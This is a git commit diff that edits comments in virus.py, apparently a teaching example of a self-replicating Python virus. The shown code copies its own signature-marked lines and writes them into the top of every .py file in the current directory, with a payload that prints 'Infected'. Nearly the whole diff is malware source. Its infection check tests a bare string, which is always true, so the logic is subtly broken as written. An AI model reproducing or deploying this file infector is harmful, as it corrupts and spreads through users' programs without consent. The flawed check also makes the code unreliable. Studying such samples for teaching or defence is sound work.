92ef4184794753e84a7926979b246ae2e3bdc12a
Ryann Rourk <ryannrourk@gmail.com>
2020-09-18 16:52:35 -0400

    Comments edited

--- virus.py
+++ virus.py
@@ -1,4 +1,4 @@
-#### VIRUS BEGIN ####
+#### VIRUS BEGIN ####                                   # virus SIGNATURE
 
 import sys, glob, re
 
@@ -8,7 +8,7 @@ import sys, glob, re
 # 4. optional payload (execute virus program)
 
 
-#### GET A COPY OF THE VIRUS ####
+#### STEP 1: GET A COPY OF THE VIRUS ####
 vCode = []                                              # virus list
 fh = open(sys.argv[0], "r")                             # open copy of self, read only
 lines = fh.readlines()                                  # read all lines of the virus file, save to lines
@@ -17,7 +17,7 @@ fh.close()                                              # close the file
 inVirus = False                                         # default: not in the virus
 
 for line in lines:                                      # iterate through lines from file
-    if (re.search('^#### VIRUS BEGIN ####', line)):     # check for the first line of the file
+    if (re.search('^#### VIRUS BEGIN ####', line)):     # check for the virus SIGNATURE
         inVirus = True                                  # if so, we are in the virus
 
     if (inVirus):                                       # while in the virus file
@@ -27,12 +27,12 @@ for line in lines:                                      # iterate through lines 
         break                                           # stop copying because end of virus code
 
 
-#### FIND POTENTIAL VICTIMS (PROGRAMS) ####
+#### STEP 2: FIND POTENTIAL VICTIMS (PROGRAMS) ####
 progs = glob.glob("*.py")                               # search for all programs with a *.py extension (python files)
 
 
-#### CHECK AND INFECT ####                              # look through potential victims, figure out if they need to be infected
-for prog in progs:                                      # iterate through programs selected previously
+#### STEP 3: CHECK AND INFECT ####                      # look through potential victims, check if infected or not
+for prog in progs:                                      # iterate through selected programs
     fh = open(prog, "r")                                # open the program file as read only
     pCode = fh.readlines()                              # read lines in file, save to pCode variable
     fh.close()                                          # close the file
@@ -40,27 +40,26 @@ for prog in progs:                                      # iterate through progra
     infected = False                                    # default assumption is that program is NOT infected
 
     for line in pCode:                                  # iterate through lines from program file
-        if ('#### VIRUS BEGIN ####'):                   # check if the first line of the virus is present
+        if ('#### VIRUS BEGIN ####'):                   # check if virus SIGNATURE is present
             infected = True                             # if so, mark infected as True
-            break                                       # break out of this for loop; continue first for loop
+            break                                       
 
-    if not infected:                                    # if infected is False, you want to infect the system
-        newCode = []                                    # newCode is a collection of original program code plus virus code
+    if not infected:                                    # if infected is False, you want to infect the program
+        newCode = []                                    # newCode will be a collection of original program code plus virus code
         if ('#!' in pCode[0]):                          # check for the first line of the virus -- starts with #
-            newCode. append(pCode.pop(0))               # add that first line to newCode
+            newCode.append(pCode.pop(0))                # add that first line to newCode
         newCode.extend(vCode)                           # load all virus code into newCode
         newCode.extend(pCode)                           # load all original program code into newCode
 
-        # write new virus infected code:
-        fh = open(prog, 'w')                            # open program code for writing
+        # write new virus-infected program code:
+        fh = open(prog, 'w')                            # open the program code for writing, so it can be edited
         fh.writelines(newCode)                          # add all lines from newCode (contains virus and program) to program
         fh.close()                                      # close the file
 
 
-#### OPTIONAL PAYLOAD: EXECUTE VIRUS ####
+#### STEP 4: OPTIONAL PAYLOAD: EXECUTE VIRUS CODE ####
 
 print("Infected")
-
 
 
 #### VIRUS END ####
